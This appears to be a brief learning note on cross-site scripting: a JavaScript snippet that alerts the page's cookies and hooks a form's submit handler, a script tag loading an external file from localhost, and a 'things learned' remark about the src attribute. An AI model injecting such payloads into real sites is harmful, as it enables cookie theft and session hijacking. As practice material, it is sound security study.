function helper(){
        alert(document.cookie);
}
document.getElementsByTagName('form')[0].setAttribute('onsubmit','return helper()');

<script src="http://127.0.0.1/test.js"></script>

things learned,
external js can be added using src attribute, the external file doesnt need script tag, just the js code
